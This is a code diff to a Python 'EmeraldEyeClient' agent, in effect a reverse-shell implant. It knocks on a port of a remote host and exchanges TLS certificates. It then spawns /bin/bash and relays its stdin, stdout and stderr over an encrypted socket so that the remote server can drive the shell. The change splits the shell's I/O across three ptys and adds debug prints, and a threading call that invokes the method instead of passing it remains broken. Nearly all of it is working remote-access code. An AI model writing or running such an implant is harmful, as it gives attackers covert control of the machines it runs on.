@@ -49,23 +49,42 @@ class EmeraldEyeClient():
             context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
             ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
             ss.connect((self.host, TLS_PORT))
-            controller, spy = pty.openpty()
+            stdin_control, stdin = pty.openpty()
+            stdout_control, stdout = pty.openpty()
+            stderr_control, stderr = pty.openpty()
             bash = subprocess.Popen("/bin/bash",
                                     preexec_fn=os.setsid,
-                                    stdin=spy,
-                                    stdout=spy,
-                                    stderr=spy,
+                                    stdin=stdin,
+                                    stdout=stdout,
+                                    stderr=stderr,
                                     universal_newlines=True)
             time.sleep(0.5)  
             while bash.poll() is None:
-                buffer, _, _ = select.select([ss, controller], [], [])
-                if controller in buffer:
-                    io_read = os.read(controller, 2048)
+                buffer, _, _ = select.select([ss, stdin_control, stdout_control, stderr_control], [], [])
+                # Need to clean this up, but having issues with io mashing together and sending in one packet
+                if stdin_control in buffer:
+                    print("A")
+                    io_read = os.read(stdin_control, 2048)
+                    if io_read:
+                        io_read += b'-emrdeye'
+                        print("Data Sent: " + io_read.decode())
+                        ss.write(io_read)
+                elif stdout_control in buffer:
+                    print("B")
+                    io_read = os.read(stdout_control, 2048)
+                    if io_read:
+                        io_read += b'-emrdeye'
+                        print("Data Sent: " + io_read.decode())
+                        ss.write(io_read)
+                elif stderr_control in buffer:
+                    print("C")
+                    io_read = os.read(stderr_control, 2048)
                     if io_read:
                         io_read += b'-emrdeye'
                         print("Data Sent: " + io_read.decode())
                         ss.write(io_read)
                 elif ss in buffer:
+                    print("D")
                     try:
                         packet = ss.recv(1024)
                         print("packet Received: " + packet.decode())
@@ -79,41 +98,40 @@ class EmeraldEyeClient():
                     while packet_left:
                         packet += ss.recv(packet_left)
                         packet_left = ss.pending()
-                    os.write(controller, packet)
+                    os.write(stdin_control, packet)
                 
     def health_check(self):
         print("Trying to connect...")
-        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-            try:
-                s.connect((self.host, KNOCK_PORT))
-                print("Connected to :" + self.host)
-                s.sendall(b'Knock')
-                packet = s.recv(1024)
-                if packet == b'Knock':
-                    print("packet Received: " + packet.decode())
-                    pass
-                elif b'crt-' in packet:
-                    print("packet Received: " + packet.decode())
-                    other_crt = packet.split(b'crt-')[1]
-                    time.sleep(0.25) 
-                    crt = b'crt-'+self.crt
-                    print("Sending cert to server...")
-                    s.sendall(crt)
-                    resv = b''
-                    while resv == b'':
-                        try:
-                            s.settimeout(5)
-                            resv = s.recv(1024)
-                        except Exception as e:
-                            print("Didn't get go signal, retrying")
-                    with open(self.tls_other_crt_file, "wt") as f:
-                        f.write(other_crt.decode("utf-8"))
-                    threading.Thread(target=self.interact(), args=()).start()              
-                else:
-                    print("Server did not get cert, will retry")
-                    print("Agent Recieved unxpected data " + str(packet))
-            except Exception as e:
-                print("Can't reach server will retry in 30 seconds")
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        try:
+            s.connect((self.host, KNOCK_PORT))
+            print("Connected to :" + self.host)
+            s.sendall(b'Knock')
+            packet = s.recv(1024)
+            if packet == b'Knock':
+                print("packet Received: " + packet.decode())
+                pass
+            elif b'crt-' in packet:
+                print("packet Received: " + packet.decode())
+                other_crt = packet.split(b'crt-')[1]
+                time.sleep(0.25) 
+                crt = b'crt-'+self.crt
+                print("Sending cert to server...")
+                s.sendall(crt)
+                resv = b''
+                while resv == b'':
+                    try:
+                        s.settimeout(5)
+                        resv = s.recv(1024)
+                    except Exception as e:
+                        print("Didn't get go signal, retrying")
+                with open(self.tls_other_crt_file, "wt") as f:
+                    f.write(other_crt.decode("utf-8"))
+                threading.Thread(target=self.interact(), args=()).start()              
+            else:
+                print("Agent Recieved unxpected data " + str(packet))
+        except Exception as e:
+            print("Can't reach server will retry in 30 seconds")
 
 def main():
     k = EmeraldEyeClient(HOST)
